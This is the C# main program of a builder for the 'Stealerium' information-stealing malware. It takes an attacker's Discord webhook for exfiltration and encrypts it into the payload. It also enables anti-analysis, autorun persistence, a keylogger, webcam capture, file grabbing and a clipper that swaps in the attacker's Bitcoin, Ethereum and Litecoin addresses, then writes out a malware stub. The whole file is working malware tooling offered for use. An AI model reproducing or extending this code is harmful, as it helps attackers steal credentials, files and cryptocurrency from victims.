using Builder.Modules;
using Builder.Modules.Build;

namespace Builder;

internal class Program
{
    [STAThread]
    private static async Task Main()
    {
        Cli.ShowLogo();

        // Settings
        var token = Cli.GetStringValue("Discord webhook url");

        if (token == null)
        {
            throw new ArgumentNullException(nameof(token), "Token parameter cannot be null.");
            // Alternatively, we can return false instead of throwing an exception:
            // return false;
        }

        // Test connection to Discord webhook url
        if (!await Discord.WebhookIsValidAsync(token))
                Cli.ShowError("Check the webhook url!");
        else
            await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
        Cli.ShowSuccess("Connected successfully!\n");

        // Encrypt values
        Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
        // Debug mode (write all exceptions to file)
        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?");
        // Installation
        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?");
        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?");
        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?");
        // Modules
        if (Build.ConfigValues["Startup"].Equals("1"))
        {
            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?");
            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?");
            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?");
        }

        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?");

        // Clipper addresses
        if (Build.ConfigValues["Clipper"].Equals("1"))
        {
            Build.ConfigValues["ClipperBTC"] = Cli.GetEncryptedString("Clipper : Your bitcoin address");
            Build.ConfigValues["ClipperETH"] = Cli.GetEncryptedString("Clipper : Your etherium address");
            Build.ConfigValues["ClipperLTC"] = Cli.GetEncryptedString("Clipper : Your litecoin address");
        }

        // Build
        var build = Build.BuildStub();

        // Done
        Cli.ShowSuccess("Stub: " + build + " saved.");
        Console.ReadLine();
    }
}